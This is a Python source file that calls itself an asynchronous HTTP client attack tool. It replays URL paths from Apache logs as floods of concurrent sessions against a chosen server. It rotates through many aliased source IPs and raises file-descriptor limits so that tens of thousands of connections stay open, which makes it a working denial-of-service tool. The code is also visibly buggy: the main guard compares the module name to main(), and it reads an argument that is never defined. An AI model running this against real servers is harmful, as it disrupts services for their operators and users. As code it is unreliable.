import threading
import socket
import random
import argparse
import myasyncore
import netifaces
import random
import queue
import resource
import time
import re
import logging
from enum import Enum
from apachelog_processing import ApacheLogParser
from data_storage import SessionBank, EventBank

sys_random = random.SystemRandom()

# from socket.h SO_BINDTODEVICE 25
SO_BINDTODEVICE=25

# Arguments (again, being bad with globals)
parser = argparse.ArgumentParser(description='Asynchronous, single-thread HTTP client attack tool.')
parser.add_argument('--server', '-s', action='store', dest='server', required=True, help='Server to target.')
parser.add_argument('--sessions', '-n', action='store', dest='num_sessions', required=True, type=int, default=50, help='Number of sessions to maintain.')
parser.add_argument('--logs', '-l', dest='logs', required=True, nargs='+',  help='File with urls to pull from. If no file is specified, requests are made to root.')
parser.add_argument('--interface', '-i', action="store", dest='device', default='eth', help='Optionally used to specify which device to send requests out of. Eg "eth0". By default, program will find device with most aliases assigned to it and use that device.')
parser.add_argument('--maxopen', '-m', action="store", type=int, dest='max_open', default=1024, help='The absolute max number of connections to have open at any interval check.')
parser.add_argument('--timeout', '-t', action='store', dest='timeout', type=int, default=3, help='Time in seconds to timeout connections.')
parser.add_argument('--duration', '-d', action='store', dest='duration', type=int, default=0, help='Duration of attack in seconds. Attack will go for *approximately* this long.')
parser.add_argument('--status', '-S', action='store_true', help='Print out status messages')
parser.add_argument('--debug_log', '-L', action='store', dest='logdir', default='', help='Log activity to specified directory for debugging.')
#parser.add_argument('--debug', '-D', action='store_true', help='Print out debug messages.')

args = parser.parse_args()

def setup_logging():
    global args
    if args.logdir == '':
        return
    session_formatter = logging.Formatter('%(message)s')
    log_formatter = logging.Formatter(fmt='%(asctime)s: %(message)s', datefmt="%s")
    try:
        timestamp=str(int(time.time()))
        shandler = logging.FileHandler(args.logdir + '/%s-sessions.txt' % timestamp)
        shandler.setFormatter(session_formatter)
        slog = logging.getLogger('sessions')
        slog.setLevel(logging.DEBUG)
        slog.addHandler(shandler)
        lhandler = logging.FileHandler(args.logdir + '/%s-log.txt' % timestamp)
        lhandler.setFormatter(log_formatter)
        llog = logging.getLogger('rundebug')
        llog.setLevel(logging.DEBUG)
        llog.addHandler(lhandler)
        ehandler = logging.FileHandler(args.logdir + '/%s-events.txt' % timestamp)
        ehandler.setFormatter(log_formatter)
        elog = logging.getLogger('eventdebug')
        elog.setLevel(logging.DEBUG)
        elog.addHandler(ehandler)
        
    except Exception as e:
        print("Issue with setting up logging: %s" % e)
        exit()


class StatType(Enum):
    current=1
    replied=2
    req_sent=3
    connected=4
    closed=5
    started=6
    inactivity=7

class StatsMsg():
    def __init__(self, type=None, value=0, ip=None):
        self.type = type
        self.value = value
        self.ip = ip

class Stats():
    def __init__(self, q=None):
        self.stats = {}
        for type in StatType:
           self.stats[type.name] = 0

    def handle_stats_msg(self, msg):
        try:
            self.stats[msg.type.name] = self.stats[msg.type.name] + msg.value
        except Exception as e:
            print("Problem parsing msg: %s" % e)
            pass
            
    def put(self, msg):
        self.handle_stats_msg(msg)
    
    def zero_stats(self):
        # We zero everything but the number of current connections.
        for stat in self.stats:
            if stat != 'current':
                self.stats[stat] = 0

    def current_conns(self):
        return self.stats['current']
    
    def started_conns(self):
        return self.stats['started']
                                        
    def print_stats(self, now=None):
        if now != None:
            msg="%s\t " % now
        else:
            msg=''
        for stat in sorted(self.stats):
            msg = msg+"%s:\t%d\t "%(stat, self.stats[stat])
        print(msg)

        
class HTTPClient(myasyncore.dispatcher):
    def __init__(self, server, path, stats_handler, ip=None, lastdata=None, timeout=None, status=False, debug=False):
        myasyncore.dispatcher.__init__(self, lastdata=lastdata, timeout=timeout)
        self.status = status
        self.stats_handler = stats_handler
        self.ip = ip
        self.stats_handler.put(StatsMsg(type=StatType.current, value=1))
        self.received_reply=False
        if debug:
            self.log = logging.getLogger('eventdebug')
        
        try:
            self.create_socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, int(args.timeout))
            # This won't buy us anything if we're going to the same server, but might as well throw it in.
            self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        except Exception as e:
            self.my_close()
            print('Failed to set sockopts:%s' % e)
            return
        
        # If we're given 
        if self.ip != None:
            try:
                self.bind((ip, 0))
            except Exception as e:
                self.my_close()
                print("Failed to bind:%s" % e)
                return
                
        self.connect((server, 80))
        self.buffer = bytes('GET %s HTTP/1.0\r\nHost: %s\r\n\r\n' % (path, server), 'ascii')
        self.req_size = len(self.buffer)
        self.stats_handler.put(StatsMsg(type=StatType.started, value=1))
        if debug:
            self.log.info("%s %s" % (ip, path))
        
    def handle_connect(self):
        if self.status:
            self.stats_handler.put(StatsMsg(type=StatType.connected, value=1))
                
    def my_close(self):
        self.stats_handler.put(StatsMsg(type=StatType.current, value=-1, ip=self.ip))
        try:
            self.socket.shutdown(socket.SHUT_RDWR)
        except Exception as e:
            #print("Failed to shutdown socket: %s" % e)
            pass
        self.close()
    
    def handle_close(self, inactivity_timeout=False):
        if self.status:
            self.stats_handler.put(StatsMsg(type=StatType.closed, value=1))
        if inactivity_timeout and self.status:
            self.stats_handler.put(StatsMsg(type=StatType.inactivity, value=1))
        self.my_close()
    
    def handle_read(self):
        data = self.recv(8192)
        if not data:
            return 
        if self.received_reply == False:
            self.received_reply = True
            if self.status:
                self.stats_handler.put(StatsMsg(type=StatType.replied, value=1))
            
    def writable(self):
        return (len(self.buffer) > 0)
    
    def handle_write(self):
        sent = self.send(self.buffer)
        if sent >= self.req_size and self.status:
            self.stats_handler.put(StatsMsg(type=StatType.req_sent, value=1)) 
        self.buffer = self.buffer[sent:]
        
    
def start_conn(q, ip, path, now):
    global args
    #print("IP: %s url: %s" % (ip, path))
    debug=False
    if args.logdir != "":
        debug=True
    client = HTTPClient(args.server, path, q, ip, lastdata=now, timeout=args.timeout, status=args.status, debug=debug)

def process_stats_queue(stats, q, urls):
    # Hack to process most of the queue, but not sit here forever as tons of connections
    # generate more stats messages.
    started_conns = 0
    for x in range(0,args.rate*6*2):
        try:
            msg = q.get_nowait()
        except queue.Empty:
             #print("Handled %d messages" % (x))
             return started_conns
        except Exception as e:
            raise e
        stats.handle_stats_msg(msg)
        # We've closed something.
        if msg.value < 0 and msg.ip != None:
            if len(urls) > 0:
                path = random.choice(urls)
            else:
                path = '/'
    print("Handled max limit of messages")
                

def get_ips():
    ips = []

    global args
    all_interfaces = netifaces.interfaces()
    
    # XXX a hack - may not have eth*: in our name, or may not want to use all that do.
    aliases = [i for i in all_interfaces if args.device in i and ':' in i]
    
    # Also a hack - but just a sanity test.
    eth_devices_with_aliases = {l.split(':')[0]: True for l in aliases}
    if len(eth_devices_with_aliases) > 1:
        print("ERROR: There appears to be more than one device with %s and aliases defined. Use '-i' to specifiy which device to use." % (args.device))
        exit()
    elif len(eth_devices_with_aliases) < 1:
        print("ERROR: Could not find a device with %s and aliases assigned. You can try using '-i' to be more specific." % args.device)
    else:
        dev = eth_devices_with_aliases.popitem()[0]
        print("Using %s with %d aliases" % (dev, len(aliases)))
    print("Getting IPs of aliases. This may take a bit.")
    devs = [i for i in all_interfaces if dev in i and ':' in i] 
    for dev in devs:
        for link in netifaces.ifaddresses(dev)[netifaces.AF_INET]:
            if (re.match('^10\.1\.',link['addr'])):
                ips.append(link['addr'])
        # We likely don't want the following - we want to rotate through
        # as many client IPs as we can??
        #if len(ips) >= args.num_sessions and args.num_sessions > 0:
        #    break
    print("Have %d IPs to work with." % len(ips))
    return ips
                                    

def main():
    global args
    
    # If we've been asked for debugging logs, check we can write these files.
    setup_logging()
    
    print("Attempting to up open file descriptor limit.")
    try:
        resource.setrlimit(resource.RLIMIT_NOFILE, (60000, 70000))
        (soft,hard) = resource.getrlimit(resource.RLIMIT_NOFILE)
        print("File descriptor limit is %d. Using this for max open" % soft)
        args.max_open = soft
    except ValueError:
        print("Not able to raise resource limit. Run this script as root!")
        exit()
    except Exception as e:
        print("Unable to set resource limits: %s" % e)
        exit()
    
    stats = Stats()
    
    # Parse log files.
    ap = ApacheLogParser(args.logs)
    if args.logdir != '':
        ap.log_sessions()
    s = SessionBank()
    ap.put_session_into_storage(s)
    
    ips = get_ips()
    
    # Loop
    seconds=0
    last_report = last_time_check = time.time()
    print("Starting attack.")
    
    debug = False
    if args.logdir != '':
        debug=True
    eb = EventBank(args.num_sessions, s, ips, timeout=int(args.timeout), debug=debug) 
    
    now = time.time()
    eb.start_session(now)
    next = eb.next_request()
    while next != None:
        try:
            # Get the number of currently running conns (to hand to start_conns so we stay within max_open)
            c = stats.current_conns()

            # Get our start time.
            now = time.time()
            
            # For stats reporting, try to report roughly every second.
            # We also use this to maintain a duration.
            if args.duration != 0 or args.status:
                if now - last_report >= 1:
                    last_report = now
                    if args.status:
                        # print and zero stats.
                        stats.print_stats(now=now)
                        stats.zero_stats()
                    seconds = seconds + 1
                    if seconds >= args.duration and args.duration != 0:
                        # These aren't really seconds, but close enough.
                        print("Reached duration limit of %d" % args.duration)
                        break

            if next.wait <= now + .05:
                if next.url != "::END::":
                    # Create request.
                    #print("Starting %.2f %s %s %.2f %.2f"  % (now, next.ip, next.url, next.wait, abs(next.wait-now)))
                    start_conn(stats, next.ip, next.url, now)
                else:
                    eb.end_session(next)
            else:
                next_wait = next.wait - now
                #print("Timeout of %.2f" % next_wait)
                eb.replace_event(next)
                try:
                    # Head back in to epoll
                    myasyncore.loop(timeout=next_wait, use_poll=True, now=now, count=None)
                except Exception as e:
                    print("Problem with epoll: %s" % e)
                    raise
            
            now = time.time()
            eb.start_session(now)
            next = eb.next_request()

        except (KeyboardInterrupt, SystemExit):
            print("Exiting.")
            break
        except Exception as e:
            print("Encountered exception: '%s'" % e)
            break
    
if __name__ == main():
    main()

